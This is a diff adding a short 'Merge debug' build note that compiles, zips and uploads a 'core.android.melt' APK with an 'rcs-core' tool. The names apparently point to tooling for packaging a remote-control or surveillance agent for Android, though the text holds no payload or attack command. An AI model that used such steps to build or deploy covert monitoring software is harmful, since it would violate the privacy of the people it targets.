@@ -1,0 +1,7 @@
+Merge debug
+
+ant merge_debug; 
+cd server/core; 
+cp ../../output/merge/core.android.melt.debug.apk core.android.melt.apk ; 
+zip ../core.debug.zip *; 
+rcs-core -R ../core.debug.zip -n android -d rcs-castore
